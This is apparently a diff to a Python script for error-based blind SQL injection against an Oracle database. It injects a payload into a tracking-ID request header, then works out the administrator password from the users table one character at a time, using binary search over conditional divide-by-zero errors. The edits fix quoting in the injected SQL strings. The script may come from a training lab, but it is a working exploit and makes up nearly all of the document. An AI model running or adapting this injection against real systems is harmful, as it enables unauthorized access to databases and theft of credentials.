@@ -23,7 +23,7 @@ def tracking_id_inject(payload1, payload2):
     host = host.rstrip("/")
 
     #payload1 is for indexing the password, payload 2 is for checking sql error
-    injection = "select case when (substr((select password from users where username = \'administrator\')," + payload1 + ",1)" + payload2 + ") then to_char(1/0) else \'1\' end from dual)=\'1"
+    injection = "\' and (select case when (substr((select password from users where username=\'administrator\')," + payload1 + ",1)" + payload2 + ") then to_char(1/0) else \'1\' end from dual)=\'1"
     
     headers = {
         'Host': host,
@@ -46,6 +46,7 @@ def tracking_id_inject(payload1, payload2):
     response = requests.get(url, headers=headers)
     #soup = BeautifulSoup(response.text, 'html.parser')
     #print(soup)
+    print(response.status_code)
     if response.status_code == 200:
         print("False")
         return False
@@ -60,7 +61,7 @@ def find_password_char():
     number = ['0','1','2','3','4','5','6','7','8','9']
     for i in range(1,21):
         print(i)
-        if tracking_id_inject(str(i), "< \'a"):
+        if tracking_id_inject(str(i), "< \'a\'"):
             admin_password += binary_search_number(number, 0, len(number) - 1, str(i))
         else:
             admin_password += binary_search_alpha(alpha, 0, len(alpha) - 1, str(i))
@@ -70,10 +71,10 @@ def find_password_char():
 def binary_search_alpha(arr, low, high, payload1):
     mid = (low + high) // 2
     #print(mid)
-    if tracking_id_inject(payload1, "= \'" + arr[mid]):
+    if tracking_id_inject(payload1, "= \'" + arr[mid] + '\''):
         print("yes")
         return arr[mid]
-    elif tracking_id_inject(payload1, "> \'" + arr[mid]):
+    elif tracking_id_inject(payload1, "> \'" + arr[mid] + '\''):
         return binary_search_alpha(arr, mid + 1, high, payload1)
     else:
         return binary_search_alpha(arr, low, mid - 1, payload1)
@@ -82,15 +83,15 @@ def binary_search_alpha(arr, low, high, payload1):
 def binary_search_number(arr, low, high, payload1):
     mid = (low + high) // 2
     #print(mid)
-    if tracking_id_inject(payload1, "= \'" + arr[mid]):
+    if tracking_id_inject(payload1, "= \'" + arr[mid] + '\''):
         return arr[mid]
-    elif tracking_id_inject(payload1, "< \'" + arr[mid]):
+    elif tracking_id_inject(payload1, "< \'" + arr[mid] + '\''):
         return binary_search_number(arr, low, mid - 1, payload1)
     else:
         return binary_search_number(arr, mid + 1, high, payload1)
 
 def test():
-    tracking_id_inject("1", "= \'w")
+    tracking_id_inject("1", "= \'w\'")
 
 
 def main():
